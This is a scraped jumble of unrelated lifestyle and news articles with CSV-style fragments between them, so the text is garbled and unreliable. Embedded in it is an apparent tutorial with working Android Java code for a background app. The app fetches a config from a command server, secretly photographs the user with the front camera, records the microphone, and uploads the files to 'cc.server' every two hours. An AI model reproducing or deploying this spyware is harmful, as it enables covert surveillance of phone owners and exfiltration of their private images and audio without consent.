But the large number of studies and the consistent findings in favor of altruism are building a pretty solid case that there are some side benefits to doing good deeds. No matter what, if you're a man seeking a woman - especially for a long-term partnership - helping others can't hurt.",One quality in men might be even more attractive than good looks and a sense of humor,

New Zealand Keeps Being Left off World Maps – and Here's Why

Where in the world is New Zealand? That question might be a no-brainer for a wanderlusting traveller plotting out their bucket list – but it appears mapmakers from all corners of the globe aren’t finding the Antipodean country quite as memorable.

Play a game of Risk and you won’t find any trace of New Zealand. Watch a popular TV series like Star Trek and, yep, there’s another map without it. Video games, t-shirt designs, wall decor, Christmas cards, in-flight magazines and even institutions that should have known better (we’re looking at you, United Nations) occasionally forget about that little country in the corner of the Pacific.

And naturally, New Zealanders aren’t all that happy about it.

This woeful omission inspired a community of sharp-eyed, social-media-savvy Kiwis to document what seems like an endless existential battle. In recent years, the subreddit MapsWithoutNZ and the Tumblr World Maps Without New Zealand have made it their mission to remind the world that, hey, this country still exists. More than 28,000 Redditors are subscribed to MapsWithoutNZ, which is updated on a daily basis.

But why does this innocent nation keep on getting the geographical cold shoulder?

Some, like the Smithsonian Natural History Museum, default to the classic excuse that they simply ‘ran out of room’. Others will say that the country accidentally got swallowed by some pesky clouds. And, to be fair, you can’t really expect a show like The Simpsons to be preoccupied with the intricate details of cartography.

Ask a handful of people on the street to look at a map without New Zealand, as the BBC recently did, and you might get a mixed reaction – some will be quick to spot the missing piece of the puzzle, while others will simply overlook it because ‘it’s so tiny, nobody notices.’

Despite their dismay at being ignored time and again, New Zealanders remain in good spirits about the whole ordeal. In fact, even the country’s government is in on the joke – its 404 Error page pays a fitting tribute to the country’s continuous battle for recognition.",New Zealand Keeps Being Left off World Maps – and Here's Why,

Like those synthetic-fiber leggings, those sweat-wicking socks, those “technical” tees? Phew. These fabrics are especially prone to harboring the smelliest bacteria.

You see, our sweat doesn’t stink on its own; bacteria that live on our skin digest our sweat and oils, and they’re the ones stinking up the place.

Polyester clothing provides an especially good home to Micrococcus bacteria after a sweaty workout, according to a 2014 study published in Applied Environmental Microbiology. The authors note that airy mesh and wicking fabrics also help the bacteria get plenty of oxygen, and that once the clothing is off our skin, our immune systems don’t keep their numbers in check.

Cotton doesn’t grow bacteria as well, and it also tends to trap some of the stink inside its fibers, where we can’t smell it. Another bonus for cotton: detergents work pretty well to remove the stink, the sweat, and the bacteria responsible. Synthetic fibers, on the other hand, are smooth and slightly oily. Detergents have a hard time getting the bacteria off.

So what can you do? Based on the science and my personal experience, I can recommend two things:

Wear cotton . It may feel sweatier when you’re wearing it, but if you don’t mind (and aren’t doing winter workouts in a situation where hypothermia is an issue), it will de-stink in the laundry just fine.



. It may feel sweatier when you’re wearing it, but if you don’t mind (and aren’t doing winter workouts in a situation where hypothermia is an issue), it will de-stink in the laundry just fine. Rinse your workout gear right away. I toss any synthetic clothes onto the floor of my shower before I hop in. Either before or after I wash myself, I rinse my clothes and squeeze them out. This removes a lot of the sweat and bacteria before they can combine to cause a big stink.

I find that after prompt rinsing, I can hang my gear up in the shower (I have hooks in there for exactly this reason) and it’s stink-free once it’s dry. Every couple wearings, I rinse it and then toss it in the regular laundry. But if you want to be really thorough, consider washing your stuff with detergent immediately after your workout.",How to Keep Your Workout Clothes From Stinking,

Plane ticket prices fluctuate, and when you purchase your ticket can mean a difference of literally hundreds of dollars, depending on where you’re traveling to.

Travel booking site CheapAir.com recently revealed the results of its 2018 Airfare study, a study where it looked at 917 million different flights listed on its site to determine where the perfect time to buy is. The results are pretty interesting.

The big question: How far in advance should you buy?

Everyone knows a last-minute plane ticket is probably expensive, but how far in advance do you need to purchase a ticket is a little less known.

According to the study, the best window of time to purchase a ticket in 2017 was 70 days in advance, a bit higher than the sweet spot in 2016 which was 54 days. However, that 70 was an average. The “best” time to buy actually depends on the season when you plan to travel.

In winter you want to try for 62 days in advance, spring 90 days in advance, summer 47 days in advance, and fall 69 days in advance, on average.

And as for that theory that there’s a best day of the week to buy—CheapAir says that’s not really true. Airfare during the week traditionally doesn’t fluctuate more than $2 from day to day, so you’re fine buying a ticket any day you want.

When it comes to when you fly, there is a difference. The cheapest days to fly are Tuesday and Wednesday, while Sunday is the most expensive.

Setting goals

It's a good thing we live in happy times when just several lines of code can make your wish come true. Let's check what we can do with a regular Android phone.

Today we're going to write a short program that will work in background mode, gathering various data we need and then send it to a specified server.

We already created a similar nice application in one of our previous articles, but it was not able to run in the background. The reason lies in the app’s activity lifecycle. You are welcome to study this subject in detail. I'll give you just a brief description: once the system registers that the user stopped using an application, it goes to the queue for unloading from the memory to clear it for other tasks. So if we want the phone to collect the data throughout the day (and night) we should see to it.

We want our application to launch every now and then to take a photo with its front camera, record a short sound sample and send it all to a certain server. To make it flexible and adjustable let’s make it download a config file to check against once in a while.

Go!

Let's first create the XML configuration file. It will be downloaded once a day and parsed with XMLPullParser. In our case we should check for opening audio and photo tags. Clearly this class allow more opportunities, so creating flexible preferences will not be a problem. The preferences proper will be saved to Shared Preferences.

XmlPullParserFactory factory = XmlPullParserFactory.newInstance(); factory.setNamespaceAware(true); XmlPullParser parser = factory.newPullParser(); // Downloading XML-file from the specified address by GET and read it using InputStream HttpURLConnection urlConnection = null; URL url = new URL(""http://cc.server/config.xml""); urlConnection = (HttpURLConnection) url.openConnection(); urlConnection.setRequestMethod(""GET""); urlConnection.connect(); InputStream input = urlConnection.getInputStream(); parser.setInput(input, null); int eventType = parser.getEventType(); // Checking the XML-file for opening tags while(eventType != XmlPullParser.END_DOCUMENT) { if(eventType == XmlPullParser.START_TAG) { if (parser.getName().contains(""photo"")) {ConfigUpdater.isPhoto=true;} else if (parser.getName().contains(""audio"")) {ConfigUpdater.isAudio=true;} eventType = parser.next(); } }

AsyncTask class allows to perform a resource-intensive task in the background mode. For example we can download files in the background without causing lags in the main application used at that moment.

public class LoadConfig extends AsyncTask<String, Void,Boolean> { private Exception exception; @Override protected Boolean doInBackground(String... urls) { try { // running a separate process for downloading and reading the config file parseXml(); } catch (Exception e) { this.exception = e; return null; } return null; } }

BroadcastReceiver class allows to sign up for receiving notifications on upcoming events in the OS. Upon receiving such notification the application will run the list of commands assigned by the developer. So after the OS registers the application as a recipient of certain notifications, it will run onReceive in appropriate class once the indicated event takes place. This works even if the phone's screen is locked or another demanding application is in use.

public void onReceive(Context context, Intent intent) { // We use AsyncTask to download and process the config file new LoadConfig().execute(); // The results are put in SharedPreferences sp = context.getSharedPreferences(""Config"", context.MODE_PRIVATE); sp.edit().putBoolean(""isAudio"", isAudio).commit(); sp.edit().putBoolean(""isPhoto"", isPhoto).commit(); }

The camera in Android can be accessed via graphical Intent or without user taking any actions. The latter makes it possible to take photos absolutely imperceptibly. We only need to determine the camera ID and use onPictureTaken method in PictureCallBack class.

private int findFrontFacingCamera() { int cameraId = -1; int numberOfCameras = Camera.getNumberOfCameras(); for (int i = 0; i < numberOfCameras; i++) { CameraInfo info = new CameraInfo(); Camera.getCameraInfo(i, info); // Looking through all the cameras to select the front camera if (info.facing == CameraInfo.CAMERA_FACING_FRONT) { cameraId = i; break; } } return cameraId; } cameraId = findFrontFacingCamera(); // Creating a new instance of the PhotoHandler class. We need it for saving a photo PhotoHandler phHandler = new PhotoHandler(camera); phHandler.setFile(file); camera.reconnect(); camera.startPreview(); camera.takePicture(null, null,phHandler);

Here is how the PhotoHandler is carried out. When creating a photo the OS will call the onPictureTaken method. It will receive a byte array containing the photo as its argument.

public class PhotoHandler implements PictureCallback { @Override public void onPictureTaken(byte[] data, Camera camera) { // Writing the byte array in the file FileOutputStream fos = new FileOutputStream(pictureFile); fos.write(data); fos.close(); ourCamera.release(); ... } }

Recording the mic input will be just as easy. We will use MediaRecorder to do it. This class allows to record sound and video depending on the parameters we set. We will work only with sound this time.

MediaRecorder myAudioRecorder; String outputFile = audioFile.toString(); myAudioRecorder=new MediaRecorder(); // The sound should be recorded from the mic to 3GP format, sound processing algorithm AMR_NB myAudioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC); myAudioRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); myAudioRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);

According to the manual, the method (onReceive) called by BroadcastReceived will be terminated after 10 seconds. To record a longer sample we will create a separate thread using the Service class.

Intent audioIntent = new Intent(context, AudioService.class); context.startService(audioIntent);

When the service is started, the mic sound will be recorded by the onHandleIntent method.

public class AudioService extends IntentService { @Override protected void onHandleIntent(Intent intent) { recordAudio(); } ... }

The easiest way to upload the data is an ordinary POST request. We will use the HttpUrlConnection class for it.

FileInputStream fileInputStream = new FileInputStream(new File(myFile) ); URL myUrl = new URL(""http://cc.server/upload.php""); HttpURLConnection connection = (HttpURLConnection) myUrl.openConnection(); connection.setDoInput(true); connection.setDoOutput(true); connection.setUseCaches(false); // Initializing the POST request connection.setRequestMethod(""POST""); connection.setRequestProperty(""Connection"", ""Keep-Alive""); connection.setRequestProperty(""Content-Type"", ""multipart/form-data;boundary=""+boundary); // Opening a connection with the server and sending the file outputStream = new DataOutputStream( connection.getOutputStream() ); outputStream.writeBytes(twoHyphens + boundary + lineEnd); // Describing the request content according to RFC 1806 outputStream.writeBytes(""Content-Disposition: form-data; name=\""uploadedfile\"";filename=\"""" + myFile +""\"""" + lineEnd); outputStream.writeBytes(lineEnd); bytesAvailable = fileInputStream.available(); bufferSize = Math.min(bytesAvailable, maxBufferSize); buffer = new byte[bufferSize]; // Reading the file into buffer at the same time fixing its size bytesRead = fileInputStream.read(buffer, 0, bufferSize); while (bytesRead > 0) { outputStream.write(buffer, 0, bufferSize); bytesAvailable = fileInputStream.available(); bufferSize = Math.min(bytesAvailable, maxBufferSize); bytesRead = fileInputStream.read(buffer, 0, bufferSize); } outputStream.writeBytes(lineEnd); outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

Now to make it all work we will enable our application to get system events notifications. The AlarmManager class allows us to schedule the launch of our application, let's make it every two hours. You are welcome to read the manual for more information.

Intent intentConfig = new Intent(this, ConfigUpdater.class); PendingIntent pIConfig = PendingIntent.getBroadcast(this.getApplicationContext(), 31337, intentConfig, 0); AlarmManager aMConfig = (AlarmManager) getSystemService(ALARM_SERVICE); // From now on the app will start every two hours aMConfig.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 7200000, pIConfig);

We also need to modify the AndroidManifest file so that our application could get permissions from the OS for creating files, Internet access, taking photographs, sound recording and reacting upon system events. During the installation of the app the system will notify the user about all the above (except for the system events). This is why it is important to pay attention to what permissions you give to an application. If a solitaire app requests permission to use the camera, it might be a malware solitaire.

Jackpot

What happens when you win big at the slots? A bit more (and a bit less) than you'd
think.

URBO.COM
",29/03/2018 13:15,https://www.urbo.com/content/what-really-happens-when-you-hit-a-casino-jackpot/,"It’s every gambler’s dream.

You put money in the slot machine, pull the lever (or press the button, on most modern machines), and watch the symbols come up. You see one cherry, two cherries, then…

Suddenly, you realize what you’re looking at. You’ve won the jackpot, and you’re about to walk out of the casino a winner. Depending on the size of the jackpot, your life might change from this point forward.

We’re happy for you, but before you count your winnings, there are a few things you should know.

1. You’re going to have to fill out a tax form.

We’re going to assume that you won more than $1,200. Bad news: The IRS gets a cut.

You’re going to have to pay tax on all of your winnings, and the casino will issue you a W-2G form, a special IRS document designed specifically for “certain gambling winnings.” The good news is that if you’re a frequent gambler, you can deduct the money you spent while chasing that jackpot—provided, of course, that you kept records of both your wins and your losses.

2. A casino worker will quickly home in on you.

Expect a quick visit from one of the casino workers. Your jackpot win just sent a signal back to the casino’s monitoring room, so an attendant will rush over to verify your win. They’ll ask to see your identification, and you won’t get a cent until you show a valid government-issued I.D.

That applies to nonresident aliens, too; they’re eligible to win jackpots, but they’re also taxed, albeit at a different rate from U.S. residents. If you don’t have any identification, the casino will hold the money in safekeeping until you can provide some. Some casinos keep millions in their safekeeping accounts for years—by law, they’re not allowed to spend it.

Provided that you’ve got identification, however, the casino might just hand you your cash. Casinos take pride in fast “hand pays,” so don’t be surprised if the attendant has a bundle of $100 bills.

3. If you win more than $5,000, you’ll probably receive a check.

Probably, but not necessarily. In some states, casinos will hand out incredibly large sums of cash, and while they’ll happily get their security teams to escort you to your car, you’re on your own after that.

Casinos prefer to pay cash whenever possible, since it increases the chances that you’ll keep playing. Hey, they’re running a business, here.

Some state laws can complicate the payout. Before they hand you anything, they’ll have to verify that you’re not on the state’s exclusion list, and if you are, you’re not getting a cent (otherwise, the casino could face a hefty fine). This is meant to deter addicted gamblers from relapsing. Hey, why play if you’ll never win?

Generally, you’ll receive the full amount that you won, because most states don’t require casinos to take out withholding taxes from gambling wins. You can ask the casino to withhold taxes, though, and usually they’ll comply.

4. By the way, you might not get anything.

When the attendant comes over to issue you your check or a hefty wad of cash, the first thing they’ll do is to check the machine. They need to verify that the slots are functioning properly and that your win wasn’t the result of a machine malfunction.

But wait—if it is a machine malfunction, that’s on the casino, right? You still get your money, don’t you?

Nope. In October 2016, a New York woman thought she’d won $43 million from a slot machine, but a casino attendant told her that the machine had malfunctioned. To compensate for the error, the casino offered her…a free steak dinner. Most slot machines have labeling that says, “Malfunctions void all pays and plays,” which protects casinos against these sorts of losses.

Unfortunately, the New York State Gaming Commission agreed with the casino that the woman was only entitled to her actual winnings, a whopping $2.25.

5. If you win more than a million dollars, you’ll only get part of the money.

You can decide to have the rest of the amount paid in full, but that’s not your only option. Most casinos will also let you take an annual fixed sum.

If you’re trying to get the biggest payout possible, the annuity is usually the smarter choice. It will make money management significantly easier and reduce your tax bill in some circumstances. Don’t worry, you don’t have to decide right away; the casino will give you 90 days to make your choice.

During that time, the casino will try its best to make you part of its marketing campaign. You’ll be invited to casino events, presented with massive checks, and interviewed by the local media. Of course you don’t have to take part in any of that if you don’t want to, but most winners get swept up in the experience.

6. If you continue to gamble, the casino will be watching you.

Make no mistake about it: When you’re gambling, you’re being intensely monitored by professionals. If you luck out and take the house for a boatload of cash, they’ll be keeping an extra close eye on you for the rest of your stay. For more on the way casinos treat you—before and after a big win—give our video below a look:

﻿

7. The casino might make you wait for a while.

Expect to wait awhile if you’ve won a massive jackpot. The casino will need to verify your win, inform managers, collect tax forms, check that you’re not on the state’s restricted list, and handle a bunch of accounting paperwork before you see a dime.

For some jackpots, payout can take hours, although the casino will work to handle it as quickly as possible. Unfortunately, in some cases, it’s out of their hands; some payouts are actually handled by game manufacturers, so you may wait days or weeks for your money.

If you’ve only won a few thousand dollars, you’ll probably get the money within minutes, but don’t stress out if it takes longer. The casino’s not trying to get out of paying. Your best bet is to go grab a meal at the casino’s restaurant and start calling banks to find a good rate on a CD.

8. If you’re a big winner, you’re incredibly lucky.

That depends on the slot machine, of course, but all of them pay out on a relatively infrequent basis. Otherwise the casinos wouldn’t make any money.

Let’s say that your slot machine has 64 stops on each reel. Your chances of getting a jackpot would be roughly 1 in 262,144 , and many machines have far more than 64 stops per reel.

If you’re looking for some good news, the law is on your side, to some degree. In most states, the slot machine must pay back at least 75 percent of the money it takes in. Percentages vary quite a bit, and casinos don’t have direct control over those percentages.

You might also be a cheater, of course, but your chances of successfully cheating a slot machine are even lower. To get away with cheating, you’d need to directly alter the erasable programmable read-only memory (EPROM) chip on the inside of the machine—something that the staff would certainly detect. You can’t “hack in,” either, since that part of the machine has no network access.",This Is What Really Happens When You Hit A Casino Jackpot,

4 Delay

Rick and Morty fans have been freaking out over the recent reveal that season 4 isn't

COMICBOOK.COM
",27/03/2018 10:30,https://comicbook.com/tv-shows/news/rick-morty-season-4-delayed-dan-harmon/,"Rick and Morty fans have been freaking out over the recent reveal that season 4 isn't officially happening yet. Series co-creator Dan Harmon said as much in response to a fan lambasting the creators for doing things like Rick and Morty-themed music videos, and now he's having to walk back those statements a bit.

Here's what Harmon had to say about why Rick and Morty season 4 isn't confirmed yet, while talking to Kevin Smith during a recent episode of his ""Smodcast"" show:

""....I don't want any 'Rick and Morty' fan hearing that and going like 'Harmon's on Smith's podcast and he's talking about how it's great how he takes as much time off as he wants.' The reason why we we're not working on 'Rick and Morty' right now ain't because I figured out that I don't need to impress you (laughs). It's a little something called contract negotiations, and it's gotten complicated this time around.""

That explanation reveals a lot of about where things stand with Rick and Morty right now. Here are the big dots to connect:

Rick and Morty saw a big expansion in viewership during season 3, growing from a cult-hit wonder to the No. 1 comedy on cable TV. The show's popularity grew beyond the viewing audience, spilling into mainstream pop-culture, thanks in large part to the McDonald's Szechuan sauce debacle. With the show's breakout hit status, creators Dan Harmon and Justin Roiland are no doubt in negotiation for bigger payouts from the show - which Cartoon Network / Adult Swim may be resisting.

At this point, it would seem like the leverage is mostly in Harmon and Roiland's corner. Rick and Morty was a huge draw for Adult Swim in 2017, even helping to lift other adult swim programming. The show served as a lead-in to the increasingly popular Toonami anime block on Saturday nights, with the specific block of Rick and Morty / Dragon Ball Super giving the network a solid boost in both ratings and branding. It wouldn't seem smart for Adult Swim to lose Rick and Morty just as the big advertising and publicity dollars are starting to sprout up - especially since a streaming service like Netflix, Hulu, or Amazon TV would almost surely scoop the show up - if cable networks like FX, Comedy Central or TBS didn't do it first.

However, the other side of this equation is Harmon and Roiland's devil-may-care approach to making the show. Rick and Morty is infamous for its long delays between seasons, with even some of the show's crew members having been quoted as complaining about the snail pace of production. If Cartoon Network is only willing to give the showrunners more money in exchange for firmer deadlines and structure, it's not hard imagining them (Harmon in particular) pushing back against that corporate mandating with claims that 'getting it right' outweighs 'getting it soon.'

But, what’s the rarest combination to actually see together?

According to Medical Daily, the most unlikely pairing is red hair and blue eyes. The traits for both red hair and blue eyes are recessive, so the chances of these two coming together are very rare.

Only 1 to 2 percent of the population has red hair and only 17 percent have blue eyes. Now, we’re not mathematicians, but the odds of both occurring simultaneously do seem pretty darn slim!

To put it in perspective, you’re more likely to get struck by lightning — .03 percent chance — than you are to meet a person with red hair and blue eyes (coming in at .017 percent). How crazy is that?

So, if not blue, what is the most common eye color for those with auburn locks? Redheads most typically have brown, hazel or green eyes.

Interested in learning some other fun facts about redheads? Here are just a few:

1. Redheads Go Gray Slowly

Red strands hold their pigment a lot longer than other colors, so redheads don’t have to be concerned with graying. Their ginger locks will simply turn more rose gold with age and eventually they’ll eventually turn completely white.

Talk about getting better with age!

2. Red-Haired Emojis Have Arrived

Redheads are unique, and therefore, probably used to feeling a little excluded (those with blue eyes even more so). But red-haired emojis recently hit smartphones everywhere, so your texting’s about to get even more inclusive!

Adobe

3. Redheads Produce Their Own Vitamin D

According to a study by ScotlandsDNAproject, those with red hair can create more vitamin D in low-light conditions than those who have darker skin or hair. So, there’s less worry of a vitamin D deficiency for redheads.

4. Red Hair Is Thicker

Redheads have fewer strands of hair on their heads.

On average, they have 90,000 strands, while blondes have 110,000 and brunettes have 140,000. But the strands that they do have are thicker, and therefore make up for the lower volume.

5. Gingers Are More Sensitive To Temperature

The gene redheads carry, MC1R, may cause the body’s temperature-detecting gene to become over-activated more quickly, making those with red manes more sensitive to cold temperatures, according to a study. If you have red hair and find yourself getting cold easier than most, now you know why!

There are pros and cons to being a redhead, but if you have red hair and blue eyes, you’re basically the unicorn of humans. And that’s very cool, right?",This Is The Rarest Hair And Eye Color Combination,

The actress has been in the public eye ever since she scored the role of Hermione Granger at age 10. While the spotlight has given the actress more roles and a social justice platform, it has also made her more vulnerable.

In an interview with Vanity Fair, Watson revealed why she opts out of selfies with fans -- it's a matter of being tracked.

""For me, it's the difference between being able to have a life and not,"" she said. ""If someone takes a photograph of me and posts it, within two seconds they've created a marker of exactly where I am within 10 meters. They can see what I'm wearing and who I'm with. I just can't give that tracking data.""

Instead of a photograph, Watson prefers to offer fans an autograph or a conversation.

""I’ll say, 'I will sit here and answer every single Harry Potter fandom question you have but I just can’t do a picture.'""

Watson's concern is completely understandable considering the intensity of the Harry Potter fandom -- which often borders on obsession.

",25/03/2018 14:52,https://www.iflscience.com/space/this-single-word-saved-the-first-moon-landing-from-disaster-at-the-final-moment/,"A couple of years ago, a man named Jack Garman passed away. You might not have heard of him, but he had a pivotal role to play in the Apollo 11 lunar landing. And it culminated in a single word that meant the landing could go ahead.

Back in 1969, John “Jack” Garman was working at NASA’s Mission Control Center at the Johnson Space Center in Houston, Texas. He was a computer engineer, involved in making sure the computer that ran the spacecraft worked as intended.

This computer was called the Apollo Guidance Computer (AGC). It was used by the astronauts to navigate and control the spacecraft, using a rudimentary number display and keyboard called a DSKY. They would input controls on this and the spacecraft would respond. Hey presto.

But during the landing attempt on July 20, with Neil Armstrong and Buzz Aldrin on board the lunar lander, something went wrong. An error mode flashed up on the AGC, called a 1202 alarm, as they were descending to the surface. For a few seconds, no one knew what to do, putting the mission in jeopardy.

Jack Garman, pictured right, worked at NASA from 1966 to 2000. NASA

“It was very Rube Goldberg but it worked,” Jack Garman told me back in 2013, when I interviewed him for All About History magazine. “It was strange, different, to have a system, a vehicle, that was run by computer. I mean today even our cars are run by computers, but back then almost all the systems were analogue.”

The AGC was designed to display an alarm when the computers got overloaded. The 1202 was one of those alarms, one of many. It basically meant that mission’s guidance computers were struggling with the amount of data they were receiving, caused by a switch being in the wrong position. Amy Shira Teitel has a good description of it over at Vintage Space if you want to learn more.

But when the astronauts reported that it kept popping up during the descent, nerves started to fray, as no one was quite sure what it meant.

“I tell you, my heart hit the floor,” Charlie Duke, who was responsible for talking between the crew and mission control at NASA, told the New York Times in 2016.

Well, it turns out someone did know the cause of the alarm. Jack Garman, on the advice of Gene Kranz – one of the flight directors for the mission, famed for his role in Apollo 13 – had fastidiously studied all the different error codes.

During a simulated landing, a 1202 alarm had caused the mission to be aborted. Kranz had been furious, and asked Garman to study every single possible program alarm that could happen. “I went and studied up on all the alarms, every one of them, and I wrote a little cheat sheet,” said Garman.",This Single Word Saved The First Moon Landing From Disaster At The Final Moment,

SNOTTY-NOSES.COM
",25/03/2018 9:00,https://snotty-noses.com/blog/hidden-dangers-one-bite-rule-and-what-do-instead,"Picky eaters, whether they are toddlers or older children can be SO frustrating, especially when it comes to trying new foods. Introducing your fussy eater to new foods can be particularly challenging. Many people use the ""one bite rule for picky eaters"" (aka the ""one polite bite"" or ""one bite rule for fussy eaters"") but feeding professionals are increasingly aware that it has negative side effects. So what can we do to help our kids try new foods instead?

I remember a meal a few years ago. I had spent ages cooking something “new and exciting” that the whole family would love. It contained only accepted ingredients, what could go wrong? Surely my children would try one tiny little bite? Actually, I was banking on the kids trying the new food and loving it first time off. How foolish!

It was a pleasant summer evening and we were eating outside in the dappled shade.

I put the dinner down. Triumphant. Expecting.

I waited for the round of applause, the cheers of “hooray! This looks yummy! Something new and tasty!”

And that’s when it happened.

Nothing.

Nope.

Nada.

Worse.

“Yuck! What’s that?” they wailed. (OK, obviously not my husband who was doing his best to encourage them.)

“You’ll love it!” I cried. “It’s got ALL your favourites in.”

They didn’t want to try it.

It was new.

It was unknown.

By now, I was getting frustrated. I’d just spent ages, toiling love sweat and tears and I was met with this response.

They wouldn’t even try it.

Not even one tiny little bite.

How did they know they didn’t like it if they wouldn’t try it? If they didn’t eat it, there wasn’t anything else for dinner. I was going to have 4 ravenous children who would be waking up in the middle of the night looking for food.

Help!

I wanted to scream.

I wanted to shout.

I wanted to command them to eat it.

But I didn’t.

And that’s when I wondered about the One Polite Bite Rule in which you tell your children that they have to try just a teeny tiny bite of the food before they decide not to eat it.

I understand the temptation. I understand the frustration. I get it. Seriously. How do children know they don’t like something when they won’t even try it?

Surely they need to try “just one tiny little bite”? Then they’ll understand that it’s not so bad. Actually it’s quite good.

Or perhaps they’ll just leave it at that and we’ll try again another day.

Rethinking the One Bite Rule for Picky Eaters

The problem with the one bite rule for fussy eaters is that it’s a slippery slope. It’s a slippery slope to pressurising your children to eat their food.

In fact, let’s be honest. It IS pressuring your children to eat, even if it’s only “gentle pressure”.

And we all know that pressuring your children to eat is bad don’t we? We know that it doesn’t work. Well, perhaps you don’t, but there is a mountain of evidence that shows that pressuring your children to eat has long term negative consequences. At best, you make the object in question more undesired. At worse, you contribute to a bad relationship with food, emotional eating, possibly even bulimia.

Yes. Seriously. Pressuring your children to eat, even one tiny little bite can have negative side effects.

But the one bite rule for picky eaters isn’t pressuring your child, you’re just encouraging right?

Well, where do you draw the line? Are you letting them choose freely to eat or not eat that food? If not, you’re pressuring them, however well intentioned.

You create a bad food experience and your child will dig in their heels and in their mind a wall will go up. “I don’t like that food”, the wall will say.

You have now created an even bigger hurdle than before. You never know, that dislike for food may last a lifetime.

What you WANT to do is to create a “safe tasting experience”.

You want to make it pleasant.

You want your child to feel safe.

You want them to feel happy trying the new food.

You want them to feel in control of the food that they put in their mouth. After all, it’s their mouth.

Let them refuse.

If they want to, let them smell, touch and see the food.

Let them JUST put it in their mouth. (Yep, let them spit it out if they don’t want to eat it.)

Present them with a teeny tiny bit.

Let them make their own choices. That’s what we’re aiming for in the long term. We want our children to grow up and choose a healthy diet.

""You don't have to eat it!""

How to Present New Food to Children

I have since learnt my lesson about presenting my children with new food.

I never make it the whole meal.

make it the whole meal. I give them options (not their favourite food but other things they can eat if they want to. Please note ""options"" doesn't mean your kids get to pick out of the cupboard, they don't get to choose chocolate biscuits in they don't eat dinner. It means instead of just peas, offer carrots and peas and they get to choose which they want.)

(not their favourite food but other things they can eat if they want to. Please note ""options"" doesn't mean your kids get to pick out of the cupboard, they don't get to choose chocolate biscuits in they don't eat dinner. It means instead of just peas, offer carrots and peas and they get to choose which they want.) I use my poker face . I don’t want them to know that I desperately want them to try it. When they do try it, I do a silent happy dance (in my mind).

. I don’t want them to know that I desperately want them to try it. When they do try it, I do a happy dance (in my mind). I give them a tiny bit so they are not overwhelmed. (My favourite is to present soup in an espresso cup. So cute!)

so they are not overwhelmed. (My favourite is to present soup in an espresso cup. So cute!) I prepare myself for the fact that they probably won’t eat it, they probably won’t even touch it. That’s fine. It is up to them to choose what they want to eat.

It is really tough learning to trust your children. It’s really tough not to pressure them to eat. And sometimes I find myself saying “just try a little bit”.

But then I stop and I remind myself.

It takes patience and persistence to teach your children to love healthy food.

Every time I present my children with new food or food that they claim they don’t like, I remind myself that it takes around 15 times of actual trying a new food to decide whether you like it or not. It takes 15 times of willingly choosing to try that food. I am teach my children to have a good relationship with food and I am teaching them to love healthy food.

I remind myself of this frequently. I remind myself that as tempting as it may be, the One Bite Rule is NOT allowing them to make that choice of their own free will.

Man Enters An Abandoned Funeral Home, But Instantly
Regrets It After Finding A Secret Room

Halloween is fast approaching, bringing with it gruesome and haunting tales that
are certain to give you nightmares. Many of the freaky stories are simply.

VIRALTHREAD.COM

",25/03/2018 6:43,https://blog.funeralone.com/holidays/funeral-service-spooky/,"

Halloween is one of the funnest times of the year, especially when you work in a funeral home. After all, what’s Halloween without an exchange of spooky funeral home stories?

I have to admit I read these stories for the first time while sitting home alone, and I’m still pretty spooked about them.

So gather around, my fellow funeral professionals, and let the scary funeral home tales begin:

#1: Gone in the blink of an eye

“We had a younger man a few weeks ago who passed suddenly. One night, after closing up and hitting the lights, we walked towards the back hallway. As I looked down the hall before heading out the door, I saw a man with dark hair and a dark suit at the end, just standing there. I thought it was a director. When I blinked, he was gone. The director with me that day was in a light gray suit, and had blonde hair.

The next day, I went to close the casket in the chapel. Lo and behold, it was the same gentleman that was in the hallway the day before. Two of my co-workers said they experienced similar events, such as when walking past his casket, they felt like they bumped into someone, but no one was there.”

#2: Turn the light on

“At least once a week we had to turn off the attic light at our funeral home. We never would turn it on, but we would always have to turn if off. We were then only ones that had access to the attic…”

– Suckit_maine via Reddit





#3: An encounter too scary for even a ghost hunter

“ …As I sat alone in the kitchen…I heard something. It was only a little sound at first and so I ignored it. But then it came again, louder this time. There was a steep spiral staircase that lead to the second floor, winding up from the corner of the small kitchen, and it was where the noise seemed to be coming from. Assuming it was simply one of the homeowners restless after dropping their son off in an institution, I glanced up.

It was coming down the stairs. I can’t say walking, because that wasn’t the case. It was just… floating isn’t even the right word. Just coming. Coming down the stairs, straight at me.

It had no eyes. It had no face. And yet somehow I knew it was looking at me, right at me, into the very depths of my soul. Then it spoke. I’m not sure how it spoke — I don’t think I actually heard anything, so perhaps it used some sort of telepathy? Either way I can recall the words to this very day: ‘You know what he did to us.’”

#4: The hands of the dead

“There aren’t many options in Atchison for funeral homes so almost everyone in town has been to all of them at some point in their lives for a service. I remember as a child sitting on a chair in the lobby of one of the more prominent funeral homes bored out of my mind during a visitation for a distant relative. A kid I knew from school walks up and says ‘hi’ and we start to chat when something catches my eye. Far down the hallway going into a closed off area of the funeral home I see the hands of an old man come around the corner and grasp onto the wall. Slowly the old man peeks his head around the corner and just stares blankly down the hallway into the visitation room. I’m thoroughly weirded out and look over at my friend who is staring down the hall, he turns to me and says ‘what is he doing?’. When we looked back the man is gone.

We didn’t ever really talk about it again until 20 years later, when I got a call from my old friend out of the blue. He says ‘this is going to sound crazy but do you remember the old man at the funeral home?’. I was a little hazy on it but I did remember. He continues to say, ‘well I was just there and my daughter saw him! During the viewing for my Uncle Bill she came over and asked my wife why the creepy man down the hallway was staring around the corner at Uncle Bill…. there wasn’t anyone there man.’

I could hear the fear in his voice and I instantly got chills. I have been back to that funeral home many times now and I have not seen anything else but I still get uneasy anytime I walk past that hallway..

#5: Graham cracker mystery

“I came home from school one typical day, and I always get home first before anybody does. I was in middle school at the time, so it wasn’t a big deal for me to be home by myself for a while. My dad was working since 6am and hasn’t been home yet. My mom was gone since 7ish. I was the only child at the time too. Anyways, I went to get a snack and brought it upstairs to play in my room. I had this old recliner chair in the corner of the room. I always sit in it when i eat my snack and watch TV or listen to music. I leaned over to the side to flip the foot rest and i felt an empty box of graham crackers. There wasn’t any plastic inside it to hold the crackers… I was like ‘hmm where did the hell did this come from?’. NOBODY in my family including myself liked graham crackers in the first place. By the way, I didn’t see it in the morning before I left for school. The house was locked up tight as a safe too!

